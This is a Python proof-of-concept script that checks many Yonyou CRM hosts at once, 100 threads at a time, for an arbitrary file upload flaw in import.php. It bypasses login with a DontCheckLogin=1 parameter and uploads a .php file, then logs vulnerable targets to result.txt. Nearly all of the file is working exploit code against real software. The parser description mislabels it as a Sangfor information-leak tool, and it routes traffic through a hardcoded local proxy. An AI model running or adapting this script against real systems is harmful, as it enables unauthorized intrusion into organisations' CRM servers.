import sys
import requests
import argparse
import json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    print("用友CRM客户关系管理系统import.php存在任意文件上传漏洞")


def main():
    banner()
    parser = argparse.ArgumentParser(description="深信服信息泄露")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            url_list = [line.strip() for line in f]

        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h")


def poc(target):
    payload = '/crmtools/tools/import.php?DontCheckLogin=1&issubmit=1'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5",
    }
    data = """------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="xfile"; filename="11.xls"

aaa
------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="combo"

aaa.php
------WebKitFormBoundarye0z8QbHs79gL8vW5--
    """
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }

    try:
        res = requests.get(url=target)
        if res.status_code == 200:
            res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
            if res1.status_code == 200:
                    res2 = json.loads(res1.text)
                    if res2.get('message') == "导入成功！":
                        print(f"[+] {target} 存在任意文件上传漏洞")
                        with open('result.txt', 'a', encoding='utf-8') as f:
                            f.write(f"[+] {target} 存在任意文件上传漏洞\n")
                    else:
                        print(f"该 {target} 不存在任意上传读取漏洞")
            else:
                print(f"POST 请求失败，状态码: {res1.status_code}")
        else:
            print()
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
